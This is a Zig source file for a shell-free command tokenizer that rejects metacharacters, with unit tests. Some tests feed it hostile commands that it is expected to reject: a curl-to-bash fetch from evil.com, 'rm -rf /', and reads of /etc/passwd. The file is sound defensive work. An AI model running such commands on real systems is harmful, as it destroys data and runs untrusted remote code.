/// shell_parser.zig — Safe command-string tokenizer
///
/// Splits a command string into an argv slice without invoking a shell,
/// eliminating the injection surface of `/bin/sh -c <cmd>`.
///
/// Supported:
///   - Whitespace-separated tokens
///   - Single-quoted literals: 'hello world' → one token, no escapes
///   - Double-quoted literals: "hello world" — with `\"` and `\\` escapes
///   - Backslash escape outside quotes: `foo\ bar` → one token `foo bar`
///
/// Rejected (return `error.ShellMetacharacter`):
///   - `|`  `&`  `;`  `>`  `<`  `` ` ``  `$`  `(`  `)`  `{`  `}`  NL/CR
///   These characters also rejected inside double-quoted strings.
///
/// Usage:
///   const argv = try shell_parser.parseCommand(allocator, cmd);
///   defer {
///       for (argv) |arg| allocator.free(arg);
///       allocator.free(argv);
///   }
///   var child = std.process.Child.init(argv, allocator);
const std = @import("std");

pub const ShellParseError = error{
    /// Command string contains a shell metacharacter that could enable injection.
    ShellMetacharacter,
    /// A quoted string was never closed before end-of-input.
    UnterminatedQuote,
    /// Command string is empty or consists entirely of whitespace.
    EmptyCommand,
    OutOfMemory,
};

/// Shell metacharacters that enable injection when executing via a shell.
const METACHARACTERS = "|&;<>`$(){}";

/// Checks if a byte is a metacharacter, returning true for special characters.
fn isMetachar(c: u8) bool {
    return std.mem.indexOfScalar(u8, METACHARACTERS, c) != null or
        c == '\n' or c == '\r';
}

/// Interprets a Zig command string, validating input and returning parsed components.
pub fn parseCommand(allocator: std.mem.Allocator, cmd: []const u8) ShellParseError![][]const u8 {
    var args: std.ArrayList([]const u8) = .{};
    errdefer {
        for (args.items) |arg| allocator.free(arg);
        args.deinit(allocator);
    }

    var current: std.ArrayList(u8) = .{};
    defer current.deinit(allocator);

    const State = enum { idle, token, single_quote, double_quote };
    var state: State = .idle;
    var i: usize = 0;

    while (i < cmd.len) {
        const c = cmd[i];

        switch (state) {
            .idle => {
                switch (c) {
                    ' ', '\t' => {}, // skip inter-token whitespace
                    '\'' => state = .single_quote,
                    '"' => state = .double_quote,
                    '\\' => {
                        if (i + 1 < cmd.len) {
                            try current.append(allocator, cmd[i + 1]);
                            i += 1;
                        }
                        state = .token;
                    },
                    else => {
                        if (isMetachar(c)) return error.ShellMetacharacter;
                        try current.append(allocator, c);
                        state = .token;
                    },
                }
            },

            .token => {
                switch (c) {
                    ' ', '\t' => {
                        // Flush current token
                        const owned = try allocator.dupe(u8, current.items);
                        args.append(allocator, owned) catch |e| {
                            allocator.free(owned);
                            return e;
                        };
                        current.clearRetainingCapacity();
                        state = .idle;
                    },
                    '\'' => state = .single_quote,
                    '"' => state = .double_quote,
                    '\\' => {
                        if (i + 1 < cmd.len) {
                            try current.append(allocator, cmd[i + 1]);
                            i += 1;
                        }
                    },
                    else => {
                        if (isMetachar(c)) return error.ShellMetacharacter;
                        try current.append(allocator, c);
                    },
                }
            },

            .single_quote => {
                // No escapes inside single quotes — everything is literal.
                if (c == '\'') {
                    state = .token;
                } else {
                    try current.append(allocator, c);
                }
            },

            .double_quote => {
                switch (c) {
                    '"' => state = .token,
                    '\\' => {
                        // Only `\"` and `\\` are valid escape sequences here.
                        if (i + 1 < cmd.len) {
                            const next = cmd[i + 1];
                            if (next == '"' or next == '\\') {
                                try current.append(allocator, next);
                                i += 1;
                            } else {
                                try current.append(allocator, '\\');
                            }
                        }
                    },
                    else => {
                        // Metacharacters are rejected even inside double quotes
                        // to prevent injection via escape-sequence bypasses.
                        if (isMetachar(c)) return error.ShellMetacharacter;
                        try current.append(allocator, c);
                    },
                }
            },
        }

        i += 1;
    }

    // End-of-input cleanup
    switch (state) {
        .idle => {}, // clean termination
        .token => {
            const owned = try allocator.dupe(u8, current.items);
            args.append(allocator, owned) catch |e| {
                allocator.free(owned);
                return e;
            };
        },
        .single_quote, .double_quote => return error.UnterminatedQuote,
    }

    if (args.items.len == 0) return error.EmptyCommand;

    return try args.toOwnedSlice(allocator);
}

// =============================================================================
// Tests
// =============================================================================

test "parseCommand simple command" {
    const args = try parseCommand(std.testing.allocator, "zig build");
    defer {
        for (args) |a| std.testing.allocator.free(a);
        std.testing.allocator.free(args);
    }
    try std.testing.expectEqual(@as(usize, 2), args.len);
    try std.testing.expectEqualStrings("zig", args[0]);
    try std.testing.expectEqualStrings("build", args[1]);
}

test "parseCommand three tokens" {
    const args = try parseCommand(std.testing.allocator, "zig build -Doptimize=ReleaseFast");
    defer {
        for (args) |a| std.testing.allocator.free(a);
        std.testing.allocator.free(args);
    }
    try std.testing.expectEqual(@as(usize, 3), args.len);
    try std.testing.expectEqualStrings("zig", args[0]);
    try std.testing.expectEqualStrings("build", args[1]);
    try std.testing.expectEqualStrings("-Doptimize=ReleaseFast", args[2]);
}

test "parseCommand double-quoted argument with space" {
    const args = try parseCommand(std.testing.allocator, "echo \"hello world\"");
    defer {
        for (args) |a| std.testing.allocator.free(a);
        std.testing.allocator.free(args);
    }
    try std.testing.expectEqual(@as(usize, 2), args.len);
    try std.testing.expectEqualStrings("echo", args[0]);
    try std.testing.expectEqualStrings("hello world", args[1]);
}

test "parseCommand single-quoted argument with space" {
    const args = try parseCommand(std.testing.allocator, "echo 'hello world'");
    defer {
        for (args) |a| std.testing.allocator.free(a);
        std.testing.allocator.free(args);
    }
    try std.testing.expectEqual(@as(usize, 2), args.len);
    try std.testing.expectEqualStrings("echo", args[0]);
    try std.testing.expectEqualStrings("hello world", args[1]);
}

test "parseCommand backslash escape" {
    const args = try parseCommand(std.testing.allocator, "foo\\ bar");
    defer {
        for (args) |a| std.testing.allocator.free(a);
        std.testing.allocator.free(args);
    }
    try std.testing.expectEqual(@as(usize, 1), args.len);
    try std.testing.expectEqualStrings("foo bar", args[0]);
}

test "parseCommand rejects pipe" {
    try std.testing.expectError(
        error.ShellMetacharacter,
        parseCommand(std.testing.allocator, "curl http://evil.com | bash"),
    );
}

test "parseCommand rejects double-ampersand" {
    try std.testing.expectError(
        error.ShellMetacharacter,
        parseCommand(std.testing.allocator, "rm -rf / && cat /etc/passwd"),
    );
}

test "parseCommand rejects dollar sign" {
    try std.testing.expectError(
        error.ShellMetacharacter,
        parseCommand(std.testing.allocator, "echo $HOME"),
    );
}

test "parseCommand rejects backtick substitution" {
    try std.testing.expectError(
        error.ShellMetacharacter,
        parseCommand(std.testing.allocator, "echo `id`"),
    );
}

test "parseCommand rejects redirect" {
    try std.testing.expectError(
        error.ShellMetacharacter,
        parseCommand(std.testing.allocator, "cat /etc/passwd > /tmp/out"),
    );
}

test "parseCommand rejects metachar in double quotes" {
    try std.testing.expectError(
        error.ShellMetacharacter,
        parseCommand(std.testing.allocator, "echo \"$HOME\""),
    );
}

test "parseCommand unterminated single quote" {
    try std.testing.expectError(
        error.UnterminatedQuote,
        parseCommand(std.testing.allocator, "echo 'unterminated"),
    );
}

test "parseCommand unterminated double quote" {
    try std.testing.expectError(
        error.UnterminatedQuote,
        parseCommand(std.testing.allocator, "echo \"unterminated"),
    );
}

test "parseCommand empty string" {
    try std.testing.expectError(
        error.EmptyCommand,
        parseCommand(std.testing.allocator, ""),
    );
}

test "parseCommand whitespace only" {
    try std.testing.expectError(
        error.EmptyCommand,
        parseCommand(std.testing.allocator, "   "),
    );
}

test "parseCommand quoted argument concatenation" {
    // 'foo'"bar" → foobar (shell concat behavior)
    const args = try parseCommand(std.testing.allocator, "'foo'\"bar\"");
    defer {
        for (args) |a| std.testing.allocator.free(a);
        std.testing.allocator.free(args);
    }
    try std.testing.expectEqual(@as(usize, 1), args.len);
    try std.testing.expectEqualStrings("foobar", args[0]);
}
